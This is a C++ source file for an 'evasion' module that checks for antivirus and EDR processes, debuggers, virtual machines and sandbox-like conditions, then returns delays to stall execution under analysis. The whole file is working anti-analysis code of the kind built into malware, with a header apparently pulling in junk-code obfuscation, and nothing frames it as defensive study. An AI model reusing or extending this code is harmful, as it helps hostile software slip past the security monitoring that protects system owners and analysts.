#include "Detection.h"
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/sysinfo.h>
#include <dirent.h>
#include <fstream>
#include <cstdlib>
#include <algorithm>
#include <random>
#include <chrono>
#include "JunkLogic.h"

namespace evasion {

bool Detection::IsAVPresent() {
    std::vector<std::string> av = {"clamd", "rkhunter", "chkrootkit", "sophosd"};
    for (const auto& a : av) if (IsProcessRunning(a)) return true;
    return false;
}

bool Detection::IsEDRPresent() {
    std::vector<std::string> edr = {"osqueryd", "auditd", "sysdig", "falco", "edr-agent", "carbonblack"};
    for (const auto& e : edr) if (IsProcessRunning(e)) return true;
    return false;
}

int Detection::GetJitterDelay() {
    if (getenv("CI")) return 0;

    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) return 300;
    std::ifstream cpu("/proc/cpuinfo"); std::string line;
    while (std::getline(cpu, line)) if (line.find("hypervisor") != std::string::npos) return 420;
    struct sysinfo si; if (sysinfo(&si) == 0 && si.uptime < 300) return 600;
    if (sysconf(_SC_NPROCESSORS_ONLN) < 2) return 900;

    if (IsEDRPresent() || IsAVPresent()) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(120, 480);
        return dis(gen);
    }
    return 0;
}

bool Detection::IsProcessRunning(const std::string& name) {
    DIR* dir = opendir("/proc"); if (!dir) return false;
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            std::string pid = entry->d_name;
            if (std::all_of(pid.begin(), pid.end(), ::isdigit)) {
                std::ifstream cmd("/proc/" + pid + "/comm"); std::string comm;
                if (std::getline(cmd, comm) && comm.find(name) != std::string::npos) { closedir(dir); return true; }
            }
        }
    }
    closedir(dir); return false;
}

} // namespace evasion
